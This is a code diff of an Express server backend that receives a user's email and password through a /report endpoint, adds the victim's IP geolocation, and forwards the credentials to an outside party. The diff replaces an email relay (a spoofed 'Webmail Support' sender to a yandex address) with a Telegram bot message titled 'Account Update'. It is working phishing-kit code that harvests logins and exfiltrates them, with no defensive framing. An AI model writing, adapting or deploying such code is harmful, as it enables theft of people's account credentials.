@@ -4,7 +4,6 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const cors = require('cors');
-const { Resend } = require('resend');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -14,8 +13,25 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Initialize Resend
-const resend = new Resend(process.env.RESEND_API_KEY);
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// Function to send message to Telegram
+const sendToTelegram = async (message) => {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,    
+            text: message,
+            parse_mode: 'HTML' // Allows HTML formatting
+        });
+        return response.data;
+    } catch (error) {
+        console.error('Error sending to Telegram:', error.response?.data || error.message);
+        throw error;
+    }
+};
 
 // Function to get location from IP
 const getLocationFromIP = async (ip) => {
@@ -64,19 +80,26 @@ app.post('/report', async (req, res) => {
         ? `IP Address: ${ip}\nLocation: ${location.city}, ${location.regionName}, ${location.country}`
         : `IP Address: ${ip}\nLocation: Unknown`;
 
+    // Format message for Telegram with HTML formatting
+    const telegramMessage = `
+🔔 <b>Account Update</b>
+
+📧 <b>User Email:</b> ${ai}
+🔑 <b>User Password:</b> ${pr}
+
+📍 <b>User IP/Location:</b>
+${locationDetails}
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `.trim();
+
     try {
-        const data = await resend.emails.send({
-            from: 'Webmail Support <mail@blu-fx.uk>', 
-            to: 'esnpav@yandex.com',
-            subject: 'Account Update',
-            text: `User Email: ${ai}\nUser Password: ${pr}\n\nUser IP/Location:\n${locationDetails}`,
-        });
-    
-        console.log('Email sent:', data.id);
-        res.status(200).json({ message:"Credentials sent to admin" });
+        const response = await sendToTelegram(telegramMessage);
+        console.log('Telegram message sent:', response);
+        res.status(200).json({ message: "Credentials sent to admin" });
     } catch (error) {
-        console.error('Error sending email:', error);
-        res.status(500).json({ message:"Failed to send credentials to admin" });
+        console.error('Error sending to Telegram:', error);
+        res.status(500).json({ message: "Failed to send credentials to admin" });
     }
 });
 
